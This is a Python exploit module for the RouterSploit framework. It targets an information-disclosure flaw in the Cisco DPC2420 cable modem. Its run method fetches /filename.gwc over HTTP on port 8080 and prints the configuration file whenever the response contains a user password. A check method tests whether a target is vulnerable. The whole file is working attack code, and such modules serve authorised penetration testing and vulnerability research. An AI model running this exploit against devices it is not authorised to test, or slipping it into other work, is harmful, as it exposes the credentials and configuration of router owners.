from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Cisco DPC2420 Info Disclosure",
        "description": "Module exploits Cisco DPC2420 information disclosure vulnerability "
                       "which allows reading sensitive information from the configuration file.",
        "authors": (
            "Facundo M. de la Cruz (tty0) <fmdlc[at]code4life.com.ar>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/23250/",
        ),
        "devices": (
            "Cisco DPC2420",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/filename.gwc",
        )
        if response is None:
            return

        if response.status_code == 200 and "User Password" in response.text:
            print_success("Exploit success - reading configuration file filename.gwc")
            print_info(response.text)
        else:
            print_error("Exploit failed - could not read configuration file")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/filename.gwc",
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "User Password" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
